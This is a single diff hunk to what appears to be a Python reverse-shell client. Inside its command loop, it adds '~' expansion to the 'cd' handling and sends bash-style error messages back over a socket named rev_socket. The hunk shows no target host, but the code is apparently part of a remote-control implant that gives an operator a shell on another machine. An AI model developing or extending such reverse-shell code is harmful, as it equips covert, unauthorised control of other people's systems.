@@ -87,7 +87,10 @@ while True:
 
     if command.startswith('cd') and len(command.split()) >= 2:
         try:
-            os.chdir(command[3:])
+            if command[3] == '~':
+                os.chdir(f'{os.path.expanduser("~")}{command[4:]}')
+            else:
+                os.chdir(command[3:])
         except IOError:
             rev_socket.send(hex_handler(f'bash: cd: {command[3:]}: No such file or directory', encode=True))
             continue
